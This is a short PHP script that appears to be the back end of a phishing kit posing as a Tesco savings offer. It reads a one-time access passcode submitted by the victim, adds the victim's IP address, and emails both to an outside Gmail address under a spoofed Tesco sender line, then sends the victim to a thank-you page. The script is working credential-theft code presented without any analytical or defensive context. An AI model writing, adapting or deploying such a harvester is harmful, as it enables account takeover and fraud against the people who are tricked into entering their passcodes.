<?php
session_start();

$ip = getenv("REMOTE_ADDR");


$msg = "
----------# One Time Access Passcode #---------------
OneTimePasscode: ".$_POST['OTA']."
--------xXx--------
IP Address: $ip
";

$subj = "TescoSavings 2019 | $ip";
$headers = "From: Tesc0 <info@tesco.com>\n";

mail("england.katty@gmail.com", $subj, $msg,"");

header("Location: thankyou.html?ip=$ip");
?>